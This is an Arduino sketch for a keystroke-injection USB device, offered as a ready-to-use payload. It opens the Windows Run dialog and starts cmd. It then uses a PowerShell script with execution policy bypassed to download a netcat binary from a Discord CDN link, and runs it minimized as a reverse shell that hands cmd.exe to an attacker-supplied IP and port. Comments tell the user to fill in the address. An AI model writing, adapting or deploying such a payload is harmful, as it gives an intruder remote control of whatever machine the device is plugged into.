#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload
  // Change The IP and the Port, and for the netcat download link you can use it but it sure will expired so change it

  // subscribe to my YouTube channel https://www.youtube.com/channel/UCL5HhLmJ7gSkf9zQu39LRoQ (dont really post anything related to this tho xD)

  // for the ip address and the port pls do remove this symbol (<>)

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("cmd");

  Keyboard.press(KEY_RETURN);

  delay(1000);

  Keyboard.print("cd / & mkdir win & cd win & echo (wget 'https://cdn.discordapp.com/attachments/823520101415911464/826813046500491264/nc64.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");

  Keyboard.press(KEY_RETURN);

  delay(3000);

  Keyboard.print("START /MIN a.exe <IP ADDRESS> <PORT> -e cmd.exe -d & exit");

  Keyboard.press(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}
